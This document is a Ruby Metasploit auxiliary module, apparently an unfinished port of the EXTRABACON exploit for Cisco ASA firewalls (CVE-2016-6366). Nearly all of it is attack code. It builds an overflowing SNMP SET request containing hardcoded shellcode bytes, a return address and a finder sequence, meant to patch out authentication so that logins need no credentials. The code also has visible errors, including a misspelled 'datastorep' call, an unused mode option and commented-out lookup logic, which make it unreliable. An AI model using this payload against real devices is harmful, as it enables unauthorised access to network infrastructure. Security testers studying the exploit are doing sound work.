##
# auxiliary/scanner/snmp/cisco_asa_extrabacon?
##


require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
      'Description' => %q{
          This module patch the authentication functions of a Cisco ASA
          to allow uncredentialed logins.
        },
      'Author'      =>
        [
          'Sean Dillon <sean.dillon@risksense.com>',
          'Zachary Harding <zachary.harding@risksense.com>',
          'Nate Caroe <nate.caroe@risksense.com>',
          'Equation Group',
          'Shadow Brokers'
        ],
      'References' =>
        [
          [ 'CVE', '2016-6366'],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptEnum.new('MODE', [ true, 'Enable or disable the password auth functions', ['pass-disable', 'pass-enable'], 'pass-disable' ])
    ], self.class)
  end

  def setup
  end

  def cleanup
    # Cleanup is called once for every single thread
  end

  def fw_version_check(vers_string)
    version = vers_string.split(/[^\d]/).join
    return "asa#{version}"
  end

  def run_host(ip)

    begin
      lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)
      datastore['VERSION'] = '2c' # 2c required it seems
      mode = datastorep['MODE']

      # cufwUrlfServerStatus
      head = "1.3.6.1.4.1.9.9.491.1.3.3.1.1.5."

      head += "9.95."
      head_len = head.split('.').length

      wrapper = ""
      #wrapper += ".144" * (82 - wrapper_len)
      #overflow = head + wrapper + ret_addr_snmp + finder_snmp
      #overflow = string.join([head, "95", wrapper, sc.my_ret_addr_snmp, sc.finder_snmp], ".")

      session = rand(255) + 1

      snmp = connect_snmp

      vers_string = snmp.get_value('1.3.6.1.2.1.47.1.1.1.1.10.1').to_s
      asa_vers = fw_version_check(vers_string)

      preamble_snmp = "49.192.49.219.49.246.49.201.96.128.197.16.128.194.7.4.125.80.187.0.128.183.9.205.128.88.187.0.80.8.8.205.128.104.49.192.64.195.88.163.16.128.183.9.163.64.90.8.8.97.104.134.115.39.9.128.195.16.191.11.15.15.15.137.229.131.197.72.195"
      launcher_snmp = "144.144.144.144.144.144"
      postscript_snmp = "97.195"
      my_ret_addr_snmp = "29.112.29.8"
      finder_snmp = "139.124.36.20.139.7.255.224.144"

      my_ret_addr_len = 4
      finder_len = 9
      #assuming dictionary name is sc...

      #wrapper = sc[asa_string]["preamble_snmp"]
      wrapper = preamble_snmp
      #wrapper += "." + sc[asa_string]["launcher_snmp"]
      wrapper += "." + launcher_snmp
      #wrapper += "." + sc[asa_string]["postscript_snmp"]
      wrapper += "." + postscript_snmp

      wrapper_len = wrapper.split('.').length
      wrapper += ".144" * (82 - wrapper_len)
      wrapper_len = wrapper.split('.').length

      #overflow = [head, "95", wrapper, sc[asa_string]["my_ret_addr_snmp"], sc[asa_string]["finder_snmp"]].join(".")
      overflow = [head, "95", wrapper, my_ret_addr_snmp, finder_snmp].join(".")
      #overflow_len = head_len + 1 + wrapper_len + sc[asa_string]["my_ret_addr_len"] + sc[asa_string]["finder_len"]
      overflow_len = head_len + 1 + wrapper_len + my_ret_addr_len + finder_len

      varbind = SNMP::VarBind.new("#{overflow}" , SNMP::Integer.new(6))
      value = snmp.set(varbind)

    # No need to make noise about timeouts
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end

end
